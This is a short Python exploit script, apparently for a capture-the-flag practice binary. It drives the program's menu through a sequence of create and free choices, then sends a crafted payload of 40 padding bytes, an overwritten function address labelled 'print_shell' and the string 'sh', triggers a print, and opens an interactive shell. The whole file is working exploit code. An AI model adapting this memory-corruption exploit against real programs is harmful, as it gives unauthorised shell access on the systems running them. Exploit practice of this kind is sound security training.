import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('Choice:'))
p.sendline('5')
print(p.readuntil('name:'))
p.sendline('a')
print(p.readuntil('Choice:'))
p.sendline('1')
print(p.readuntil('name:'))
p.sendline('b')
print(p.readuntil('Choice:'))
p.sendline('7')
print(p.readuntil('Choice:'))
p.sendline('1')
print(p.readuntil('name:'))

print_shell = p64(0x400e56)
payload = b'A'*40 + print_shell + b'sh\x00'
p.sendline(payload)

print(p.readuntil('Choice:'))
p.sendline('3')
print(p.readuntil('print:'))
p.sendline('0')

p.interactive()
